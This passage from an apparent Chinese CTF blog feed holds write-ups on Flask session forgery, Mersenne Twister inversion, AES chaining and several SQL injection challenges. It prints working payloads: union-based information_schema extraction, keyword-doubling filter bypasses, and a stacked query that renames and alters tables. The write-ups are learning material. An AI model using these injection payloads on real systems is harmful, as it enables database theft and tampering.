class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure><p>拿到secret_key以后，伪造session重发即可拿到flag</p><p>还根据师傅的博客学习到利用解密session绕过验证码， 不过这道题里的session直接给了验证码hh</p><p>3.条件竞争</p><p><strong>threading.Thread类</strong></p><p>创建线程<code>thread=threading.Thread(target=function_name, args=(function_parameter1, function_parameterN))</code></p><p>function_name: 需要线程去执行的方法名</p><p>args: 线程执行方法接收的参数，该属性是一个<strong>元组</strong>，如果只有一个参数也需要在末尾加逗号。</p><p>启动创建的线程<code>thread.start()</code></p><p><strong>requests模块</strong></p><p>不带参数get请求<code>r=requests.get(&#39;&#39;)</code></p><p>带参数的get请求<code>r=requests.get(&#39;&#39;,params=url_params)</code></p><p>其中字典传递参数url_params={‘key’:’value’}</p><p>post请求<code>r=requests.post(&#39;&#39;)</code></p><p>带参数的post请求<code>r=requests.post(url,data=params)</code></p><p>params同样为字典传递参数</p><p><code>r=requests.post(url,data=params)</code></p><p><img src="https://images2017.cnblogs.com/blog/77835/201709/77835-20170907152822351-1210277893.png" alt="img"></p><p>r.text输出结果:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"args"</span>: &#123;&#125;, </span><br><span class="line">  <span class="string">"data"</span>: <span class="string">""</span>, </span><br><span class="line">  <span class="string">"files"</span>: &#123;&#125;, </span><br><span class="line">  <span class="string">"form"</span>: &#123;</span><br><span class="line">    <span class="string">"key1"</span>: <span class="string">"value1"</span>, </span><br><span class="line">    <span class="string">"key2"</span>: <span class="string">"value2"</span></span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="string">"headers"</span>: &#123;</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"*/*"</span>, </span><br><span class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, </span><br><span class="line">    <span class="string">"Connection"</span>: <span class="string">"close"</span>, </span><br><span class="line">    <span class="string">"Content-Length"</span>: <span class="string">"23"</span>, </span><br><span class="line">    <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>, </span><br><span class="line">    <span class="string">"Host"</span>: <span class="string">"httpbin.org"</span>, </span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"python-requests/2.18.1"</span></span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="string">"json"</span>: null, </span><br><span class="line">  <span class="string">"origin"</span>: <span class="string">"183.14.133.88"</span>, </span><br><span class="line">  <span class="string">"url"</span>: <span class="string">"http://httpbin.org/post"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>flask</tag>
      
      <tag>ssti</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mt[SUCTF]</title>
    <link href="/2020/08/09/mt-SUCTF/"/>
    <url>/2020/08/09/mt-SUCTF/</url>
    
    <content type="html"><![CDATA[<p>MT的提取算法逆向</p><a id="more"></a><p>学习出处:<a href="https://liam.page/2018/01/12/Mersenne-twister/" target="_blank" rel="noopener">https://liam.page/2018/01/12/Mersenne-twister/</a></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(m)</span>:</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">13</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">9</span> &amp; <span class="number">2029229568</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">17</span> &amp; <span class="number">2245263360</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">19</span></span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transform</span><span class="params">(message)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(message) % <span class="number">4</span> == <span class="number">0</span></span><br><span class="line">    new_message = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(message) / <span class="number">4</span>):</span><br><span class="line">        block = message[i * <span class="number">4</span> : i * <span class="number">4</span> +<span class="number">4</span>]</span><br><span class="line">        block = number.bytes_to_long(block)</span><br><span class="line">        block = convert(block)</span><br><span class="line">        block = number.long_to_bytes(block, <span class="number">4</span>)</span><br><span class="line">        new_message += block</span><br><span class="line">    <span class="keyword">return</span> new_message</span><br><span class="line"></span><br><span class="line">transformed_flag = transform(flag[<span class="number">5</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)).encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'transformed_flag:'</span>, transformed_flag</span><br><span class="line"><span class="comment"># transformed_flag: 641460a9e3953b1aaa21f3a2</span></span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="逆提取算法"><a href="#逆提取算法" class="headerlink" title="逆提取算法"></a>逆提取算法</h3><h4 id="向右移位异或"><a href="#向右移位异或" class="headerlink" title="向右移位异或"></a>向右移位异或</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result=value^value&gt;&gt;shift</span><br></pre></td></tr></table></figure><p>result的前shift位和value相同</p><p>使用比特遮罩或截取result的前shift位得到value的前shift位</p><p>tmp=value&gt;&gt;shift</p><p>由此可以得到tmp的前shift*2位 </p><p>与result异或 得到value的前shift*2位</p><p>循环往复，可以得到value</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">right</span><span class="params">(result, shift)</span>:</span></span><br><span class="line">    i,value=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i*shift&lt;<span class="number">32</span>:</span><br><span class="line">        part_mask=((kMaxBits &lt;&lt; (<span class="number">32</span> - shift)) &amp; kMaxBits)&gt;&gt;(i*shift)</span><br><span class="line">        part=result&amp;part_mask</span><br><span class="line">        result^=part&gt;&gt;shift</span><br><span class="line">        value|=part</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure><h4 id="向左移位异或"><a href="#向左移位异或" class="headerlink" title="向左移位异或"></a>向左移位异或</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result=value^value&lt;&lt;shift&amp;mask</span><br></pre></td></tr></table></figure><p>tmp=value&lt;&lt;shift</p><p>同理，result的后shift位与value相同，比特遮罩取后shift位</p><p>可知value的前shift*2位</p><p>循环往复</p><p>与右移不同的是此处mask取对应的位，逆算法中也要取相应的位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">left</span><span class="params">(result,shift,mask)</span>:</span></span><br><span class="line">    i,value=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i*shift&lt;<span class="number">32</span>:</span><br><span class="line">        part_mask=((kMaxBits&gt;&gt;(<span class="number">32</span>-shift)&amp;kMaxBits))&lt;&lt;(i*shift)</span><br><span class="line">        part=result&amp;part_mask</span><br><span class="line">        result^=(part&lt;&lt;shift)&amp;mask</span><br><span class="line">        value|=part</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">kMaxBits = <span class="number">0xffffffff</span></span><br><span class="line">c1 = <span class="number">0x641460a9</span></span><br><span class="line">c2 = <span class="number">0xe3953b1a</span></span><br><span class="line">c3 =<span class="number">0xaa21f3a2</span></span><br><span class="line">c=<span class="string">'641460a9e3953b1aaa21f3a2'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">right</span><span class="params">(result, shift)</span>:</span></span><br><span class="line">    i,value=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i*shift&lt;<span class="number">32</span>:</span><br><span class="line">        part_mask=((kMaxBits &lt;&lt; (<span class="number">32</span> - shift)) &amp; kMaxBits)&gt;&gt;(i*shift)</span><br><span class="line">        part=result&amp;part_mask</span><br><span class="line">        result^=part&gt;&gt;shift</span><br><span class="line">        value|=part</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">left</span><span class="params">(result,shift,mask)</span>:</span></span><br><span class="line">    i,value=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i*shift&lt;<span class="number">32</span>:</span><br><span class="line">        part_mask=((kMaxBits&gt;&gt;(<span class="number">32</span>-shift)&amp;kMaxBits))&lt;&lt;(i*shift)</span><br><span class="line">        part=result&amp;part_mask</span><br><span class="line">        result^=(part&lt;&lt;shift)&amp;mask</span><br><span class="line">        value|=part</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(m)</span>:</span></span><br><span class="line">    m = right(m, <span class="number">19</span>)</span><br><span class="line">    m = left(m, <span class="number">17</span>, <span class="number">2245263360</span>)</span><br><span class="line">    m = left(m, <span class="number">9</span>, <span class="number">2029229568</span>)</span><br><span class="line">    m = right(m, <span class="number">13</span>)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">s1=hex(decrypt(c1))[<span class="number">2</span>:]</span><br><span class="line">s2=hex(decrypt(c2))[<span class="number">2</span>:]</span><br><span class="line">s3=hex(decrypt(c3))[<span class="number">2</span>:]</span><br><span class="line">print(s1+s2+s3)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>crypto刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mt19937</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入[极客大挑战]</title>
    <link href="/2020/08/05/sql%E6%B3%A8%E5%85%A5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"/>
    <url>/2020/08/05/sql%E6%B3%A8%E5%85%A5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</url>
    
    <content type="html"><![CDATA[<p>sql注入</p><a id="more"></a><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>发现username和password都能注入，使用万能密码</p><p><img src="/2020/08/05/sql%E6%B3%A8%E5%85%A5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20200806150937579.png" alt="image-20200806150937579"></p><p>万能密码学习：<a href="https://blog.csdn.net/weixin_43952190/article/details/105696239" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43952190/article/details/105696239</a></p><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>按照上一题的思路万能密码得到admin的密码(但是好像并没有什么用emm</p><p><img src="/2020/08/05/sql%E6%B3%A8%E5%85%A5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20200806151229803.png" alt="image-20200806151229803"></p><p>判断字段为3</p><p>?username=admin’ order by 4%23&amp;password=1</p><p>注意:这里的注释#在输入框中输入时可以用#，而在地址栏时必须是%23</p><p>使用union查询发现2,3字段处显示数据</p><p>注意:注入时不能使用admin,2,3位置会显示admin的数据</p><p>答疑：为什么使用错误的username和password也会显示login success</p><p>代码可能是这样写的：只要能查出结果，就能成功登录</p><p><img src="/2020/08/05/sql%E6%B3%A8%E5%85%A5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20200806152232415.png" alt="image-20200806152232415"></p><p>(感谢我伟大的web队友)</p><p>得到数据库名geek</p><p><img src="/2020/08/05/sql%E6%B3%A8%E5%85%A5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20200806152437389.png" alt="image-20200806152437389"></p><p>?username=1’ union select 1,2,group_concat(table_name)  from information_schema.tables where table_schema=database()%23&amp;password=1</p><p>得到两张表’geekuser,l0ve1ysq1’</p><p>?username=1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’l0ve1ysq1’%23&amp;password=1</p><p>得到表’10ve1ysq1’的字段id,username和password</p><p>?username=1’ union select 1,2,group_concat(password) from l0ve1ysq1%23&amp;password=1</p><p>得到password，包含flag</p><h2 id="极客大挑战-BabySQL"><a href="#极客大挑战-BabySQL" class="headerlink" title="[极客大挑战]BabySQL"></a>[极客大挑战]BabySQL</h2><p>先向前两个一样尝试了万能密码 没反应</p><p>然后尝试order by发现报错</p><p><img src="/2020/08/05/sql%E6%B3%A8%E5%85%A5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20200810095309420.png" alt="image-20200810095309420"></p><p>or被过滤</p><blockquote><p>双写关键字绕过</p><p>有的waf只会对关键词过滤一次，这时候采用双写的方式可以绕过。</p><p>　　selselectect <em> from user; 过滤select后变成 select </em> from user;</p><p><a href="https://www.cnblogs.com/zllovellyo/p/12593352.html" target="_blank" rel="noopener">https://www.cnblogs.com/zllovellyo/p/12593352.html</a></p></blockquote><p>尝试双写关键字绕过</p><p>?username=admin&amp;password=1’ oorrder bbyy 5%23</p><p>得到字段数为3</p><p>查看当前数据库的表名</p><p>?username=admin&amp;password=1’ ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database() %23</p><p><img src="/2020/08/05/sql%E6%B3%A8%E5%85%A5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20200810094723349.png" alt="image-20200810094723349"></p><p>查看字段</p><p>?username=admin&amp;password=1’ ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=database() aandnd table_name=’b4bsql’%23</p><p><img src="/2020/08/05/sql%E6%B3%A8%E5%85%A5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20200810094732805.png" alt="image-20200810094732805"></p><p>查看数据，本来以为会在别的数据库里，没想到直接在password里出来了哈哈哈</p><p>?username=admin&amp;password=1’ ununionion seselectlect 1,2,group_concat(passwoorrd) frfromom b4bsql%23</p><p>得到flag</p>]]></content>
    
    
    <categories>
      
      <category>web刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>随便注[强网杯]</title>
    <link href="/2020/07/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8-%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
    <url>/2020/07/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8-%E5%BC%BA%E7%BD%91%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<p>sql注入</p><a id="more"></a><p>学习出处：</p><p><a href="https://blog.csdn.net/weixin_45551083/article/details/105389126" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45551083/article/details/105389126</a></p><p><a href="https://blog.csdn.net/qq_26406447/article/details/90643951" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/90643951</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br></pre></td></tr></table></figure><p>select/update/delete/drop/insert/where过滤</p><p>无法使用union联合查询，使用堆叠注入</p><p>查看数据库 ?inject=1’ ;show databases—+</p><p>查看表 ?inject=1’ ;show tables-+</p><p>查看列  ?inject=1’ ;show columns from words—+</p><p> 注意：查看列的时候要注明 from哪个表</p><p>查询1919810931114514表中所有列</p><p>?inject=1’ ;show columns from `1919810931114514`—+</p><blockquote><p>关于反引号：表名、字段、数据库名等标识符可用反引号 `  。<br>标识符也可以不使用反引号，但如果标识符包含特殊字符或保留字，则必须使用。</p><p><img src="/2020/07/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8-%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20200730092402760.png" alt="image-20200730092402760"></p></blockquote><p><strong>rename</strong></p><p>rename <strong>tables</strong> tbl_name to new_tbl_name [, tbl_name2 to new_tbl_name2] …本语bai句用于对一个或多个表进行du重命名。</p><p><strong>alter table</strong>s</p><p><img src="/2020/07/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8-%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20200730093600749.png" alt="image-20200730093600749"></p><p><img src="/2020/07/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8-%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20200730093702863.png" alt="image-20200730093702863"></p><p>?id=1’;rename tables`words` to `aaa`;rename tables `1919810931114514` to `words`;alter table `words` add `id` int(10);alter table`words` change `flag` `data` varchar(100)—+</p><p>?id=1’ or 1=1—+</p><p>得到flag</p><h4 id="关于是否修改flag为data"><a href="#关于是否修改flag为data" class="headerlink" title="关于是否修改flag为data"></a>关于是否修改flag为data</h4><p>看了很多wp,发现不用修改列名也能得到flag</p><p>或者直接把flag改为id也可以</p><p><a href="https://blog.csdn.net/qq_26406447/article/details/90643951" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/90643951</a></p><p>在这条中得到了答案</p><p>之前猜测的内部查询语句是</p><p>select id,data from words where id=</p><p>结果有出入，推测 select * from words where id=</p><h4 id="答疑"><a href="#答疑" class="headerlink" title="答疑"></a>答疑</h4><p>1.为什么最后得到flag需要or 1=1，直接查询1’—+不行</p><p>插入id列后 查找不到id=1 需要or 1=1通过验证</p><p>2.为什么这条语句直接查询1 可以得到flag</p><p>1’;rename table `words` to `word1`;rename table `1919810931114514` to `words`;alter table `words` add id int unsigned not Null auto_increment primary key; alert table `words` change `flag`  `data` varchar(100);#</p><p>因为这条语句插入id列 <code>auto_increment primary key</code> id的主键值实现自增</p><p>所以查询1可以得到flag值</p>]]></content>
    
    
    <categories>
      
      <category>web刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MyOwnCBC[AFCTF2018]</title>
    <link href="/2020/07/11/MyOwnCBC%5BAFCTF2018%5D/"/>
    <url>/2020/07/11/MyOwnCBC%5BAFCTF2018%5D/</url>
    
    <content type="html"><![CDATA[<p>分组密码的CBC与EBC模式</p><a id="more"></a><p>学习出处:</p><p><a href="https://www.cnblogs.com/eleven-elv/p/7289579.html" target="_blank" rel="noopener">https://www.cnblogs.com/eleven-elv/p/7289579.html</a></p><p><a href="https://www.jianshu.com/p/79a225c2650e" target="_blank" rel="noopener">https://www.jianshu.com/p/79a225c2650e</a></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MyOwnCBC</span><span class="params">(key, plain)</span>:</span></span><br><span class="line"><span class="keyword">if</span> len(key)!=<span class="number">32</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">"error!"</span></span><br><span class="line">cipher_txt = <span class="string">b""</span></span><br><span class="line">cipher_arr = []</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB, <span class="string">""</span>)</span><br><span class="line">plain = [plain[i:i+<span class="number">32</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(plain), <span class="number">32</span>)]</span><br><span class="line"><span class="keyword">print</span> plain</span><br><span class="line">cipher_arr.append(cipher.encrypt(plain[<span class="number">0</span>]))</span><br><span class="line">cipher_txt += cipher_arr[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(plain)):</span><br><span class="line">cipher = AES.new(cipher_arr[i<span class="number">-1</span>], AES.MODE_ECB, <span class="string">""</span>)</span><br><span class="line">cipher_arr.append(cipher.encrypt(plain[i]))</span><br><span class="line">cipher_txt += cipher_arr[i]</span><br><span class="line"><span class="keyword">return</span> cipher_txt</span><br><span class="line"></span><br><span class="line">key = random.getrandbits(<span class="number">256</span>)</span><br><span class="line">key = long_to_bytes(key)</span><br><span class="line"></span><br><span class="line">s = <span class="string">""</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"flag.txt"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">s = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"flag_cipher"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(MyOwnCBC(key, s))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>不同于一般的CBC,该题不是将加密后的一小段密文作为iv，而是直接作为下一次加密的key。</p><p>由于给出密文，将其分段后，就可以从最后一段逐段推出前一段明文，但由于不知道初始key,所以无法推出第一段明文（flag放到了文末）</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>ECB模式</p><blockquote><p>电码本模式</p><p>这种模式是将整个明文分成若干段相同的小段，然后对每一小段进行加密。</p></blockquote><p><img src="/2020/07/11/MyOwnCBC[AFCTF2018]/image-20200712162612376.png" alt="image-20200712162612376"></p><p>CBC模式</p><blockquote><p>密码分组链接模式</p><p> 这种模式是先将明文切分成若干小段，然后每一小段与初始块或者上一段的密文段进行异或运算后，再与密钥进行加密。</p></blockquote><p><img src="/2020/07/11/MyOwnCBC[AFCTF2018]/image-20200712162708926.png" alt="image-20200712162708926"></p><p>搬运自:<a href="https://www.jianshu.com/p/79a225c2650e" target="_blank" rel="noopener">https://www.jianshu.com/p/79a225c2650e</a></p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">cipher_text=open(<span class="string">'MyOwnCBC/flag_cipher'</span>,<span class="string">'rb'</span>).read()</span><br><span class="line">cipher=[]</span><br><span class="line">plain=[]</span><br><span class="line">mode=AES.MODE_ECB</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(cipher_text),<span class="number">32</span>):</span><br><span class="line">    cipher.append(cipher_text[i:i+<span class="number">32</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)<span class="number">-1</span>):</span><br><span class="line">    cryptor=AES.new(cipher[(<span class="number">-1</span>)*i<span class="number">-2</span>],mode)</span><br><span class="line">    plain.append(cryptor.decrypt(cipher[(<span class="number">-1</span>)*i<span class="number">-1</span>]))</span><br><span class="line">flag=[i.decode(<span class="string">'utf-8'</span>) <span class="keyword">for</span> i <span class="keyword">in</span>  plain]</span><br><span class="line">print(<span class="string">''</span>.join(flag[::<span class="number">-1</span>]))</span><br></pre></td></tr></table></figure><p><img src="/2020/07/11/MyOwnCBC[AFCTF2018]/image-20200712163031171.png" alt="image-20200712163031171"></p>]]></content>
    
    
    <categories>
      
      <category>crypto刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AES</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ECC-RSA[watevrCTF 2019]</title>
    <link href="/2020/07/10/ECC-RSA/"/>
    <url>/2020/07/10/ECC-RSA/</url>
    
    <content type="html"><![CDATA[<p>椭圆曲线ECC与RSA</p><a id="more"></a><p>学习出处：<a href="https://www.anquanke.com/post/id/196010?display=mobile" target="_blank" rel="noopener">https://www.anquanke.com/post/id/196010?display=mobile</a></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 